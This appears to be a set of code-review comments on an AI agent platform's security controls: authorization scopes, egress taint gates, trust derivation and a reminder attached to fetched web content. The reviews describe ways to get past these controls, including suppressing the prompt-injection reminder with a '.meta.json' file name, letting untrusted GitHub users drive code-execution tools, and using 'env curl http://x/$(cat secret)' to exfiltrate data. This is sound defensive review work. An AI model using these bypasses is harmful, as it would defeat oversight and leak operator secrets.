payload.author: mimir-carreira
payload.title: Worklink #977: authz read scope rejects the agent's virtual home paths (/state/x denied while <home>/state/x resolves) — 313 would-blocks

payload.author: jasoncarreira
payload.body:
Requesting changes on the capability half. The core virtual-path fix is good; the manifest grants widen read authority well beyond the bug.

**Verified good — the actual fix.** `resolve_non_admin_read_target` now matches the literal path against the roots first and, when that fails, re-resolves through `_RootAwareFilesystemBackend(root_dir=home, virtual_mode=True)._resolve_path(raw_path)` — reusing the backend rather than re-implementing path mapping, as asked. The security-critical tail is intact: `selected_root = max(lexical_roots, …)` followed by the resolved-under-selected-root containment check (read_policy.py:238-240) and the `is_protected_read_path` gate, so symlink/`..` escapes and protected paths still fail. That alone fixes the reported 313 blocks — my audit probe confirmed this poller's *repo* reads already resolved; only the virtual shape (`/state/x`) was failing.

**Blocking: the read-capability grants are too broad, and a read capability currently bypasses BOTH scoping layers.**

Granting `read_file`/`aread`/`ls`/`als`/`glob`/`aglob`/`grep`/`agrep`/`file_search` to all seven poller manifests has a consequence I don't think was intended:

1. In `authorize_tool`'s `READ_RESOURCE_OPERATIONS` branch, `elif service_allowed: allowed = True` short-circuits **before** `read_target_from_arguments` — so a granted service's reads are not path-scoped at the authz seam at all.
2. `non_admin_read_filter_enabled()` (read_policy.py:58-59) returns False when `is_service` — so service reads also skip the read-time protected-path/secret filter.

Net: after this change a research-tier `social-cli` or `gmail-poller` principal may read `<home>/.mimir/saga.db`, `.env`, `credentials.*`, `identities.*`, `prompts/`, and `memory/core/` — none of which those pollers need, and strictly more read authority than a non-admin human has. Before this PR they held no read capability, so they were both path-scoped and secret-filtered. That contradicts this leaf's review criterion ("no widening of the non-admin read scope beyond making the existing allowed roots addressable in both path shapes").

Required — either:
- **(preferred)** drop the blanket manifest grants; keep the virtual-path fix as the fix for the 313 blocks. If a specific principal demonstrably needs reads its scoped roots don't cover, grant that one and cite the prompt/code path that needs it (the same justification bar #978 carries); **or**
- keep the grants but make them safe: service reads must remain subject to the protected-path/secret filter (extend `non_admin_read_filter_enabled` to cover services, so only the *scope* check is capability-cleared, never the secret/protected-file check), with a test that a read-capable service is denied `<home>/.mimir/saga.db` and `.env`.

Two smaller notes: these are the repo `mimir/optional-skills/**` copies, so live poller authority won't change until a skills update — the acceptance criterion should be verified against the live manifests too; and `file_search` was added to the synthesis/system principals in `access_control.py`, which is fine, but it belongs with #978's capability work where the justification bar applies.

payload.body:

The fix itself is intact and correct: literal-path matching first, falling back to `_RootAwareFilesystemBackend(root_dir=home, virtual_mode=True)._resolve_path` for the agent's virtual paths (reusing the backend rather than re-implementing), with the security tail preserved — resolved-under-selected-root containment plus `is_protected_read_path`. Tests cover the four cases that matter: virtual/real equivalence for a state file, virtual non-state home paths still denied, protected + symlink targets still denied, and a read-capable service using its declared grant.

CI green 3.11/3.12. Merging.

Separately (not this PR's problem): a service read capability currently clears both the path scope AND the protected/secret filter, since `non_admin_read_filter_enabled()` excludes `is_service`. That asymmetry is worth its own fix so future capability grants are safe by construction — filing it rather than bolting it on here.

payload.author: jasoncarreira
payload.body:
Requesting changes — one confirmed enable-time regression.

The caller-axis matrix is right for the **dynamic** trigger principals: `build_trigger_service_principal` now unions the per-trigger `roots` (incl. the state root) with the configured repo RW roots, and the test confirms trigger-state + repo are writable while home/readonly/outside/tmp are denied. That part is good, and the worklink-trusted-turn / spawn-blocked handling is correct.

**Blocking:** the two **static** principals in `_TRUSTED_SERVICE_PRINCIPALS` are *live* authorities, and this PR strands them.

- `scheduler` (trigger `scheduled_tick`, `Scheduler._fire_job`) is the authority for **every non-heartbeat scheduled tick** — `reflect`, `memory-hygiene`, `issues-audit`, `commitments-review`, the weekly research scan. `system` (trigger `upgrade`) is the authority for **all upgrade turns**. (Only `heartbeat` and the pollers carry dynamic principals.)
- This PR swaps their `write_file`/`edit_file` policy from `configured_file_roots` (`[home, *rw_roots]`) to `configured_repo_write_roots` (explicit `MIMIR_FILE_TOOL_ROOTS` rw entries only — **no home, no state, no memory**).
- Under `MIMIR_ACCESS_CONTROL_ENFORCED=1` those turns then hit `service_sink_destination_denied` on their own `<home>/state/**` and `<home>/memory/**` writes — which the live prompts do (`memory/core/*`, `memory/issues/*`, `state/audit/`, `state/reports/`, `state/wiki/`). If `MIMIR_FILE_TOOL_ROOTS` is unset they can write **nowhere** (the profile is `scheduler_read_only`, so there's no shell fallback). This violates the #970 criterion "repo RW roots **+ its per-trigger state root**."

**Required change (operator-confirmed scope: autonomous = repo + state + memory):** the static `scheduler` and `system` principals' write scope must be repo RW roots **plus** `<home>/state/**` **plus** `<home>/memory/**`, while still denying the protected carve-outs (`.env`/config/credentials/identities/secrets, `memory/core`? — see note, prompts, `.mimir`). Keep the dynamic-principal behavior exactly as-is. Ensure the unset-`MIMIR_FILE_TOOL_ROOTS` case still permits home writes (don't strand autonomous turns on deployments without a configured repo root).

Note on `memory/core`: `reflect`/`memory-hygiene` do edit `memory/core/*.md`, so the autonomous write carve-out must **not** treat `memory/core` as protected for the service axis (it stays protected for the non-admin-human axis in #969/#1174). Please make the protected-for-write set axis-aware, or scope the service write allowance to include `memory/**` in full.

**Add regression coverage:** a `scheduler`/`system`-principal `write_file` to `<home>/state/...` and `<home>/memory/...` (non-protected) is allowed under `enforce=True`; writes to `.env`/config/credentials/prompts are still denied; and the unset-`MIMIR_FILE_TOOL_ROOTS` case still allows the home writes rather than denying everything.

payload.author: jasoncarreira
payload.title: authz: exclude injected runtime arg from tool-arg serialization (fix turn-crash regression #971)

payload.author: mimir-carreira
payload.body:
## Summary

The serialization failure is real, but this fix removes the injected runtime from execution as well as from `model_dump()`. That breaks every runtime-authorized tool, so this is not safe to merge in its current form.

## Blocking issue

`mimir/tools/registry.py:2557-2559`

> `field_info.exclude = True`

LangChain only restores injected values after `model_dump()` for keys in `tool._injected_args_keys`. In the installed LangChain version, `StructuredTool._injected_args_keys` inspects the wrapped function signature with `inspect.signature()`. Because these modules use `from __future__ import annotations`, the wrapped function's runtime annotation is the string `'ToolRuntime[AuthContext]'`; LangChain's `_is_injected_arg_type()` returns false for it, and all 13 affected tools report an empty `_injected_args_keys` set.

After this PR marks `runtime` excluded, `_parse_input()` therefore omits it from `result_dict` and does not re-inject it. The underlying function receives its default `None`, causing authorization failures such as `commitment_complete failed: authorization context unavailable`, `saga_end_session failed: write access denied`, and analogous failures across the runtime-bearing surface.

Please preserve or explicitly repair runtime injection while avoiding serialization—for example, resolve the wrapped function type hints so LangChain records `runtime` as injected, or otherwise populate a supported injected-key path—and add an invocation-level regression that calls at least one authorization-dependent tool through `.ainvoke()` with a real `ToolRuntime` and asserts the runtime reaches the function. The current test only constructs the Pydantic schema and calls `model_dump()`, so it misses the execution regression.

## Validation

- PR's targeted command: `374 passed`.
- Invocation-level reproduction: `tests/test_registry_tools.py::test_commitment_mutation_tools_pass_runtime_actor` fails immediately after the PR test passes.
- Full CI agrees: both Python jobs fail with `48 failed, 6485 passed, 16 skipped`; failures cluster around runtime authorization/provenance in commitment and SAGA tools.
- `git diff --check` is clean.

payload.author: mimir-carreira
payload.body:
## Verdict: APPROVE

Both prior blocking findings are resolved at exact head `019fa3f6187d740d3e86e91385172c9a6db90b8e`.

The remediation moves the fix to `AuthContext` serialization itself: validation remains unchanged, while Pydantic emits an opaque placeholder instead of descending into populated IFC labels or lock-bearing state. Crucially, no injected field is excluded anymore. The invocation-path regression now exercises LangChain's actual `_parse_input()` behavior and proves both security-sensitive values survive parsing by identity/value:

- `memory_get`: the real `ToolRuntime[AuthContext]` reaches the parsed arguments with populated IFC labels.
- `bash_async`: server-authorized `mimir_direct_argv` remains intact rather than falling back to the model command.

I also re-ran the prior failing authorization path and the broader affected suite locally: **378 passed**. `git diff --check` is clean, and all five GitHub checks—including pytest on Python 3.11 and 3.12—are green.

payload.author: jasoncarreira
payload.body: Review status: **blocking**. Injected runtime values are dropped after schema serialization, and the same mechanism discards the server-authorized direct argv used by trusted-service shell execution. The current head also fails 48 tests on both supported Python versions. See the two inline comments for reproductions and required end-to-end coverage. GitHub does not permit the PR author to submit a formal Request Changes review.

payload.author: jasoncarreira
payload.body:
Both blocking findings fixed in 019fa3f6 — thank you, you were right on both, and I'd only verified via `model_dump()`, not delivery.

The first approach (excluding injected args from serialization) was wrong exactly as you described: these tools use postponed annotations, so `_injected_args_keys` is empty and langchain never reinserts — excluding dropped `runtime` (→ None) and `mimir_direct_argv` (→ `bash -lc` fallback, the argv-invariant regression).

Corrected approach: the crash is only in `model_dump()`'s *serialization* of the bound `AuthContext` (recursing into `ifc_labels`'s `frozenset[SourceLabel]` and `ifc_state`'s threading.Lock). langchain uses that dump only to compute the field set; delivered values come from `getattr` on the validated model. So `AuthContext.__get_pydantic_core_schema__` now keeps the default **validation** schema and overrides only **serialization** to an opaque placeholder — nothing is excluded, so `runtime` and `mimir_direct_argv` both still reach the tool.

Verified through the exact crash path (`_parse_input`), not `model_dump` alone:
- `memory_get`: `parsed["runtime"] is runtime` (real object delivered), no crash with a populated-IFC context.
- `bash_async`: `parsed["mimir_direct_argv"] == ["git","status"]` (server argv preserved).
Masked-checked. **CI pytest 3.11 + 3.12 both green** — the 48 authorization failures are cleared.

payload.author: mimir-carreira
payload.title: Worklink #969: authz: read/search tools non-admin, scoped to repo + /tmp + state (config/secrets stay admin)

payload.author: jasoncarreira
payload.body:
Adversarial review (correctness + security). The security core is sound and well-tested — one blocking concern on the collection/get_turn enforcement approach.

## Sound and well done
- `_resolve_target` is solid: rejects non-str / empty / NUL, requires absolute, `resolve(strict=True)` (follows symlinks + `..` to the real path, non-existent → None), then `is_relative_to` an allowed root, with the home root itself excluded. Traversal/symlink escape is genuinely closed, and it fails closed.
- Protected carve-outs (secret basenames, `.env.*`, `oauth_*.json`, `.key`/`.pem`, `.mimir` / `prompts` / `memory/core`) plus a `contains_secret` content belt are a good defense-in-depth layer. Admin and service-principal paths are correctly untouched. Tests cover the deny/fail-closed properties well.

## Blocking: the collection / get_turn path re-walks the tree at authz time
`_target_from_arguments` + `_collection_is_safe` re-enumerate candidates and run `read_text` + `contains_secret` on every one, at the authorization seam, before the tool runs:
- `grep`/`agrep` → `target.rglob(glob or "*")` — secret-scans the entire recursive tree.
- `file_search` → `rglob("*.md")` over `<home>/state`.
- `get_turn`/`mimir_get_turn` → content-scans the *entire* `turns.jsonl` (which is large).

Two problems:
1. **Performance, on exactly the ops this feature exists to enable.** Every non-admin `grep`/`ls`/`file_search`/`get_turn` reads and secret-scans a whole tree / a huge file before executing. It's latent right now (single-operator = admin, and admins + service principals short-circuit this path), but it bites precisely when a real non-admin caller uses it — a non-admin `grep` re-scans the repo, `get_turn` reads all of `turns.jsonl`. That undermines the feature.
2. **Soundness: the check re-implements the tool's traversal.** `_collection_is_safe` walks `rglob`/`iterdir`/`glob` itself. That can drift from what the tool actually reads (gitignore, binary-skip, hidden files, symlink handling), so the scanned set ≠ the returned set — risking both false denials and, if the tool reads a file the authz walk missed, a skipped content-scan carve-out.

## Suggested direction
Keep the cheap, sound parts — the single-file `_resolve_target` (root + basename/dir carve-outs + single-file content scan) — and stop re-walking the tree at the authz seam:
- Authorize a collection read on its **root** being in-scope + the cheap basename/dir carve-outs (O(1)-ish), and enforce the per-file secret/protected-file skip **at read time inside the tools/backend** — single source of truth, consistent with the tool's real traversal, no double-read. (The file-tool backend already scopes roots; this is the natural place.)
- Or, if the content belt must stay at the authz seam, bound it (single-file `read_file` only; collections rely on root + carve-outs) so the check is not O(tree)/O(turns.jsonl).
- Either way, add a test that exercises a collection read over a tree containing a carve-out file, and one that would catch the O(tree) behavior (e.g. asserts the authz check doesn't read every file).

Everything else looks right — the re-tiering, the catalog wiring, the adapter hook, and the deny/fail-closed tests. Fix the collection-scan approach and I'll re-review.

payload.author: jason-visotrust
payload.body: Re-requesting changes (no revision landed yet). Per my earlier review: the collection / get_turn path re-walks and secret-scans the tree at the authz seam — a performance hit on the exact ops this feature enables (a non-admin grep rglob-scans the tree; get_turn reads all of turns.jsonl), and a soundness gap (the authz-time enumeration re-implements the tool traversal, so the scanned set can differ from what the tool reads). Keep the single-file resolver + root/basename/dir carve-outs; move the per-file secret/protected enforcement to read-time in the tools/backend so the authz check is O(1)-ish. Please re-attempt.

payload.title: Worklink #855: React app: add/manage MCP servers with per-tool authorization tier + IFC trust posture (#957)

payload.author: jasoncarreira
payload.body:
Adversarial review across both lenses (implementation correctness + security). This is a strong PR — one blocking skinning defect to fix, then I will merge.

## Security — verified sound
- **Un-forgeable admin-only write:** all five routes live under `/api/v1/admin/mcp/*`, so `server.py` `_ADMIN_REQUIRED_PREFIXES` + the auth middleware return 403 for any non-admin *before* the handler runs. The model/agent principal is never admin, so no lower-trust or model-reachable path can create/select/widen a tier or posture. #957 guarantee holds at the transport layer.
- **Posture values fail closed:** `update_tool_policy` enum-validates classification/result_integrity/argument_egress (invalid → 400).
- **Provenance binding enforced:** approval requires matching `config_digest`/`schema_digest` (mismatch → 409 `provenance_conflict`); tombstoned/undeclared tools → 404; the UI round-trips the digests it received, so drift forces rediscovery.
- **Runtime consumes one operator-owned store, fail-closed:** `_apply_stored_policies` attaches a stored policy only when `server_config_id` matches the immutable server, not tombstoned, not already config-defined, and the record parses complete — otherwise fail-closed. Discovery/re-discovery/remove all re-default to `admin_required`/`untrusted`/`taint_gated`.
- The widened MCP `classify` (admin_required allowed for admin-role principals) is legitimate — roles come from the AuthContext, not model-controllable.

## Correctness — verified
- Fail-closed UI defaults (`admin_required`/`untrusted`/`taint_gated`); the `widening` flag drives the consequential-choice warning; drift badge on tombstoned tools; digest round-trip wired end-to-end.

## Blocking: widening-choice warning ignores the active skin
`.mcp-tool__warning` (frontend/src/styles.css) uses `var(--mimir-color-warning, #9a6700)` for both the border and the `color-mix` background, but **`--mimir-color-warning` is not a real skin token** — it is undefined everywhere in the frontend, so this box always renders the hardcoded `#9a6700` regardless of skin. The canonical token is `--mimir-color-status-warning` (+ `--mimir-color-status-warning-background`), as used by `.ui-badge--warning` (styles.css:402-403). This is the security-consequential affordance (the result_integrity=trusted / argument_egress=allowed warning), so it must track the skin.

Fix — mirror the existing badge pattern:

```css
.mcp-tool__warning {
  border: var(--mimir-border-width-hairline, 1px) solid var(--mimir-color-status-warning, #7a5b1d);
  color: var(--mimir-color-status-warning, #7a5b1d);
  background: var(--mimir-color-status-warning-background, #fbf1d8);
}
```

(Drop the `#9a6700` fallbacks and the `color-mix` on the nonexistent token; the `!important` on `color` can go once the class no longer competes.)

## Non-blocking (optional)
- `admin_mcp_upsert_v1` runs `store.load_server_records()` / `store.upsert_server()` / `_mcp_payload()` synchronously on the event loop, while list/remove/policy correctly use `asyncio.to_thread`. Tiny file + admin-only, so low impact, but wrapping upsert the same way would be consistent and keep the loop unblocked during tool discovery.

Please fix the token and re-request review; everything else is good to merge.

payload.title: Worklink #949: authz/IFC enablement: network egress boundary (exact-URL/deterministic dispatch + payload gate + child-process egress)

payload.author: jasoncarreira
payload.body:
The egress controls are verified clean (exact-URL allowlist, per-hop redirect re-check, payload gating, per-exact-URL session ask — all masked-checked). One change before merge, on the turn-taint gate's scope.

**Exempt destination-safe egress from the turn-taint integrity gate; keep it only for content that can reach a human/third-party audience.**

The `is_application_egress and egress_origin is MODEL and has_untrusted_active_ingest` block currently gates `fetch_url` and `web_search`, which over-blocks (a heartbeat can't fetch its approved URL list once the first fetch taints the turn) for no real security gain:

- **`fetch_url`** carries no model-controlled data out — exact-URL match (no query injection), GET (no body), no arbitrary headers. Its control is the exact-URL allowlist + redirect re-check. The only residual (which approved URL / order) is the low-bandwidth invocation-pattern channel already accepted in §5.4.
- **`web_search`** goes to a fixed, operator-pre-approved search service; the query can only land in that trusted provider's logs, never the attacker. Approving the search tool implies approving that query text goes there. Residual (sensitive text in the provider's logs) accepted.

So make `{fetch_url, web_search}` **taint-independent** — allowed regardless of `has_untrusted_active_ingest`, gated only by their destination control (fetch_url exact-URL allowlist; web_search fixed service). Apply this in **both** gate paths: the `_service_tier_allows` UNBOUNDED branch **and** the `check_sink_flow` model+untrusted block. This lets you **drop the unused `EgressOrigin`/`TRUSTED_CONFIG` machinery** — no deterministic dispatcher is needed; the allowlist/fixed-service is the control.

**Keep the turn-taint gate** for content that reaches an audience:
- **`webhook` / `http_request`** — free-form model body to an approved URL that may be a human/multi-party channel (e.g. a Slack webhook); a confused deputy could leak operator data to that audience.
- **external MCP (`mcp_*`)** — keep **fail-closed** (gated + results untrusted) for now; per-MCP/tool trust posture is a separate follow-up (filing it now).

Tests to add/adjust: heartbeat fetches multiple approved exact-URLs in one turn after an untrusted fetch (taint-independent); `web_search` allowed after untrusted active ingest; `webhook`/`http_request`/MCP still blocked (model body/args) after untrusted active ingest; MCP fail-closed. Keep the exact-URL + redirect + ask-on-first-use tests.

Also trim §5.4: the line is **destination-reachability** (exact-URL allowlist / fixed pre-approved service ⇒ taint-independent), not payload-bearing-vs-not; MCP fail-closed pending per-tool posture.

payload.author: mimir-carreira
payload.title: Worklink #955: Add ingestion-time prompt-injection reminder for fetched web content

payload.author: jasoncarreira
payload.body:
Adversarial review — the core design is right (classification via resolved real path + `relative_to(cache)`, enforcement-independent, subagents covered), but there's one **blocking** suppression vector I confirmed at runtime, plus a couple of notes.

## BLOCKING — `.meta.json` exclusion is an attacker-influenceable suppression (confirmed)

`_is_fetched_body` excludes sidecars with `not target.name.endswith(".meta.json")`. But the cache **body** filename is `{digest}-{base_name}`, where `base_name = _sanitize_download_name(Path(url.path).name)` — and the sanitizer preserves `.` / a `.meta.json` suffix. So a fetched URL whose last path segment ends in `.meta.json` produces a *body* file named `{digest}-evil.meta.json`, which the exclusion then treats as a sidecar → **no reminder**.

Confirmed at runtime:
```
_sanitize_download_name("evil.meta.json") -> "evil.meta.json"
normal body (…-page.html)        _is_fetched_body -> True   (reminder applied)
attacker body (…-evil.meta.json) _is_fetched_body -> False  (reminder SUPPRESSED)
```

The URL's last path segment is attacker-controlled (they host the page or craft the link the agent fetches), so an attacker can name their malicious page `*.meta.json` and strip the prompt-injection reminder off their own content — the exact case the reminder exists for. This directly violates acceptance criterion #2 ("a caller cannot … suppress the classification merely by choosing a lookalike path").

**Fix (either):**
- Drop the `.meta.json` exclusion — over-reminding on the server metadata sidecar is harmless (it's server-written JSON; a prepended reminder does no damage), whereas under-reminding on a body is the failure to avoid. Fail *safe*. OR
- Detect the sidecar robustly rather than by its own suffix — e.g. treat a file as the sidecar only when a sibling body (its name minus `.meta.json`) also exists in the cache. An attacker's `…-evil.meta.json` body has no sibling `…-evil`, so it's correctly classified as a body.

Add a regression: a fetched body whose sanitized name ends in `.meta.json` still receives the reminder.

## Notes (non-blocking)
1. **Resolved-vs-string claim is under-tested.** The docstring's central claim ("uses the resolved file target, not caller-controlled path text") isn't exercised by a positive resolved-path case — add a symlink-into-cache (from a non-cache path) and a home-absolute-path read, both asserting the reminder *is* added. The logic is correct as written; this just substantiates the claim the leaf is built on.
2. **Shell-read bypass** (`shell_exec cat`/`grep` on a cache file) skips the reminder — within the documented read_file-only DiD scope, so noting rather than objecting; a one-line code comment marking it a known residual would be good.
3. **Normalization is reimplemented** (home-absolute → virtual) independently of the file backend; correct for the cache (always under home), but if the read path handling ever diverges (e.g. CompositeBackend routes), this silently drops the reminder. A comment pinning the "cache is always under home" assumption would help.

Once the `.meta.json` suppression is closed + covered, this is good — it's a clean, well-scoped DiD layer otherwise.

All three non-blocking notes also addressed (shell-read + cache-under-home comments; symlink/home-absolute tests). Approving to merge per operator authorization.

payload.title: Worklink #947: authz/IFC enablement: per-trigger capability config (named, tier-validated, narrow immutable roots)

payload.author: jasoncarreira
payload.body:
Adversarial review — the #947 design is implemented well; one **blocking** structural bug from a bad code insertion, plus one note. Everything else holds up.

## Strong (verified)
- Manifest authority parsing is properly fail-closed: exact required key set `{profile,tier,capabilities,scoped_roots}` (unknown/missing → raise → poller not registered), tier validation, caps-outside-profile rejection, unbounded rejection for skill pollers, `state`/`wiki:<slug>` roots with traversal guards + existence checks, and file caps require a scoped root.
- Per-instance principals (`poller:<name>`) replace the generic `poller`; it's removed from `_TRUSTED_SERVICE_PRINCIPALS` **and** `_REQUIRED_SERVICE_PRINCIPALS`. Authority rides the event as `service_authority` and `get_event_service_principal` validates it matches the event's trigger+principal (continuation-stable, no widening).
- Overrides can't widen: authority fields stay out of `POLLER_OVERRIDE_KEYS`, misplaced-authority at entry top-level is rejected, and there are tests for both (`test_overrides_cannot_set_authority_fields`, `test_unknown_or_out_of_bounds_authority_rejects_instance`).
- Shadow-mode behavior preserved (gate only enforces under `enforce=True`), so this is enable-time only.

## BLOCKING — bad insertion split `_target_matches_worklink_repo` (AST-confirmed)

The three new adapters were inserted **inside** `_target_matches_worklink_repo`, severing it:

- `_target_matches_worklink_repo` now ends at `if not configured: return False` with **no return for the configured case** → it returns `None` (falsy) for *every* target when `WORKLINK_REPO`/`MIMIR_WORKLINK_REPO` is set. It can never return `True`, so the `worklink_repo` sink adapter never authorizes a dispatch. Under enforcement this **denies `worklink_run`** for any principal routed through this adapter — the heartbeat profile's `worklink_run` today, and poller `worklink_run` once #946 enables integrity-aware widening. (AST: body ends in an `If`; only the `False` return exists.)
- The original comparison logic (`Path(target).resolve() == Path(configured).resolve()`) is now **unreachable dead code inside `_target_matches_approved_url`**, sitting after `return target in approved` and referencing an undefined `configured`. (AST: a `Try` block follows a `Return`; it references `configured`, which is out of scope there.)

CI stayed green because **nothing tests this adapter** — the only `worklink_repo` tests exercise `autonomy.worklink_repo()`, a different helper. `_target_matches_approved_url` happens to still work (the dead code is after its real return), so the concrete functional break is `worklink_repo`.

**Fix:** restore the resolve-equality return in `_target_matches_worklink_repo`; delete the orphaned `try` block from `_target_matches_approved_url`; add a direct regression for the adapter (matching target → True, non-matching → False, unset env → False) so this path stops being uncovered.

## Note (non-blocking)
- The heartbeat built-in declares `capability_tier=CODE_EXECUTION` but holds `fetch_url` (an UNBOUNDED capability). Built-ins skip the manifest tier-validation so it isn't enforced-inconsistent, but the tier label is misleading — set heartbeat to `UNBOUNDED` (its true ceiling) or document that built-in tiers are advisory.

This also builds on #945, which has its own request-changes (GitHub trust lookup). Once the worklink_repo function is restored + covered, this is solid.

payload.author: mimir-carreira
payload.title: Worklink #950: authz/IFC enablement: worklink opencode file-permission confinement (external_directory deny + bash restriction)

payload.author: jasoncarreira
payload.body:
Adversarial review — mechanism is correct and well-verified; one blocking issue in the **default allowlist**.

Verified against the opencode source (checkout at odin/opencode):
- `OPENCODE_PERMISSION` is a real, documented flag — `config.ts:544` does `mergeDeep(result.permission, JSON.parse(OPENCODE_PERMISSION))`, applied as the override, so it wins over file/project config. Not a no-op. ✅
- Evaluation is **last-match-wins** (`permission/index.ts` `evaluate()` uses `.findLast(...)`; same in `core/permission.ts:80`), so `{"*":"deny","git *":"allow"}` denies by default and allows `git *`. The "OpenCode evaluates the last matching rule" claim holds. ✅
- Registry rejects the catch-all `*` and empty/non-string entries; config validation is good. ✅

## BLOCKING — `env *` in the default allowlist defeats the allowlist

`DEFAULT_BASH_ALLOWLIST = ("git *", "uv *", "env *")`. `env` is a **pure command launcher**: `env <anything>` runs an arbitrary binary with a modified environment — `env sh -c '…'`, `env curl http://x/$(cat secret)`, `env python -c '…'`. So `env *` re-permits everything the deny-by-default rule is meant to block; the allowlist provides ~no restriction out of the box. Unlike `git`/`uv` (which the work actually needs), `env` contributes no work capability of its own — it's only there to support test commands like `env -u MIMIR_MODEL_SPEC uv run pytest`.

**Fix:** drop `env` from the default and remove the need for it — worklink controls the subprocess environment, so unset `MIMIR_MODEL_SPEC` (etc.) directly in `WorkSpec.env` and run `uv run pytest` rather than shelling through `env`. If a repo genuinely needs `env`, an operator can add a narrower pattern in `bash_allowlist`, but the shipped Mimir default shouldn't include a universal launcher.

## Notes (non-blocking)
1. **`uv *` is itself arbitrary code** (`uv run python -c '…'`), and `git` has hooks/`-c core.pager`. So even after removing `env`, the allowlist is a porous DiD layer, not a boundary — which the doc already states correctly ("allowed command and its arguments still have the host user's filesystem and network authority… trusted-code-only"). No change needed; just calibrating that the real confinement here is `external_directory` (file tools) + the future isolated compute, and the bash allowlist's value is modest by nature. Removing the pure launcher is still worth it.
2. **Deep-merge with project config.** `OPENCODE_PERMISSION` deep-merges over any `opencode.json` in the target repo, so a repo's own `permission.bash` entries get unioned in. The env catch-all `"*":"deny"` lands after project-original keys (mergeDeep appends new keys), so last-match-wins still resolves non-allowlisted commands to deny — I traced this and it holds. Fine for the trusted-code model; noting it since the confinement isn't hermetic against target-repo config.
3. **Test is construction-only** — it asserts the `OPENCODE_PERMISSION` JSON is set correctly, not that opencode honors it. I verified the honoring in source, so the criterion is substantially met; the doc's "Pinned-runtime verification" note covers the rest. Confirm the factory's shipped opencode version matches the 1.17.15 you verified against (local here is 1.18.3; the mechanism is present in both).

Once `env *` is out of the default (and the env-unset handled in `WorkSpec.env`), this is good.

payload.title: Worklink #945: authz/IFC enablement: integrity axis (integrity + integrity_effect on SourceLabel) + trust derivation

payload.author: jasoncarreira
payload.body:
Adversarial review — one **blocking** finding (confirmed against the live repo), plus two non-blocking notes. The `SourceLabel.derived` carrier work, the `has_untrusted_active_ingest` predicate, the fail-closed defaults, and the ingest classification are all correct and well-tested — so the fix here is localized to the GitHub trust lookup.

## BLOCKING — `permission == "read"` is a trust bypass on public repos (confirmed)

`mimir/pollers.py` `_github_author_is_trusted` treats `permission in {read, triage, write, maintain, admin}` as trusted. But `GET /repos/{owner}/{repo}/collaborators/{username}/permission` returns `permission: "read"` for **any** user on a **public** repo (everyone has public-read), not just collaborators. `jasoncarreira/mimir` is public, so this is live, not latent.

Confirmed against the actual target repo just now:
```
repos/jasoncarreira/mimir/collaborators/torvalds/permission -> permission=read role_name=read
repos/jasoncarreira/mimir/collaborators/defunkt/permission  -> permission=read role_name=read
repos/jasoncarreira/mimir/collaborators/octocat/permission  -> permission=read role_name=read
# existence endpoint, same users:
repos/jasoncarreira/mimir/collaborators/torvalds -> HTTP 404
repos/jasoncarreira/mimir/collaborators/defunkt  -> HTTP 404
```

**Impact:** an arbitrary GitHub user who opens an issue/PR or leaves a comment is classified `integrity=trusted` → their content is `trusted`+`active_ingest` → passes the integrity gate → can drive **trusted-only Code-execution sinks (`worklink_run`)**. That is precisely the non-contributor injection vector #945's acceptance criteria require to be `untrusted` ("Non-contributor GitHub comments => untrusted"), and it's the worst failure direction (untrusted→trusted).

**Fix (verified):** gate on collaborator *existence*, not the permission *level*. `GET /repos/{owner}/{repo}/collaborators/{username}` returns **204** for an actual collaborator (any level, incl. read-collaborators, incl. team/org-derived) and **404** for public-read non-collaborators — verified 404 above for the non-collaborators. Use that (204 → trusted) instead of accepting the `read` permission string; keep the org-membership fallback. The `permission` field conflates "public read" with "is a collaborator" and must not be the trust signal. (Both endpoints require push access on the token; a 403/None still fails closed, which is correct.)

## Non-blocking notes
1. **Org membership visibility.** `GET /orgs/{org}/memberships/{username}` only returns another user's membership when the caller is an org member/admin; otherwise 404 → `False`. That's fail-*safe* (may under-trust real org members), so not blocking — just flagging that org-member trust depends on the token's org privilege.
2. **`user_message` breadth.** Any `user_message` from a non-`api`/`http` source is trusted, i.e. *all* channel participants, not just the operator. This is consistent with the "user turns are operator turns / operator is the backstop" design decision, so noting it for the record rather than objecting — worth a comment in the code so it's an explicit choice.

Once the trust lookup uses the existence check (with a regression: a public-repo non-collaborator resolves `untrusted`, an actual collaborator `trusted`), this is good to go.

payload.title: docs(security): enforcement-enablement design — sink classification + poller capabilities

payload.author: mimir-carreira
payload.body:
The blast-radius reframe is promising, and I agree with separating per-poller capabilities from the generic poller principal. One containment premise is currently false, though, and it makes the proposed allowlist unsafe as written: generic `spawn_*` is not equivalent to Worklink's isolated-worktree + reviewed-PR path. Please either restrict this design to `worklink_run` until spawn has an executable isolation/postcondition contract, or specify and implement that contract before allowing spawn from untrusted-payload turns.

The open-question directions I recommend are: named capabilities rather than roles; exact-host/URL grants with an ask-on-first-use flow rather than a broad standing network grant; accept direct-operator trust only as an explicitly single-user interim policy and make integrity labels a prerequisite for multi-user deployment; and render provenance structurally, while not treating rendered provenance as an enforcement boundary.

I reviewed the design against the current authorization and spawn implementations. No test run was needed for this docs-only review.

payload.author: mimir-carreira
payload.body:
## Summary

The diagnosis is useful, but the proposed enablement model currently treats several sinks as contained when the live implementation does not establish that containment. Enabling it as written would convert attacker-controlled poller payloads into direct code/config mutation authority, so I don't think this is safe to adopt yet.

## Blocking issues

1. **`spawn_*` is not worktree-confined or necessarily review-gated.** The document groups all three spawn tools with `worklink_run` as “running in an isolated worktree” whose only durable output is a reviewed PR. In the live code, `spawn_claude_code`, `spawn_codex`, and `spawn_open_code` merely run the corresponding CLI with the requested `cwd`; `_target_within_configured_write_roots` only checks that `cwd` is somewhere under a configured writable root. On this deployment that includes `/workspace/mimir`, and `spawn_codex` has no mandatory sandbox flag. A poller payload could therefore select the live repo (or `/mimir-home`) and ask the child to mutate it directly; no worktree or PR gate is enforced. `spawn_open_code` also has a separately writable `artifact_root`, and Claude/OpenCode children have their own filesystem/tool authority. Either restrict the “Contained” tier to `worklink_run` until spawn has an executable confinement/review postcondition, or make the design require a dedicated poller spawn wrapper that allocates an isolated worktree, confines all writable outputs, and gates durable effects on observed PR evidence.

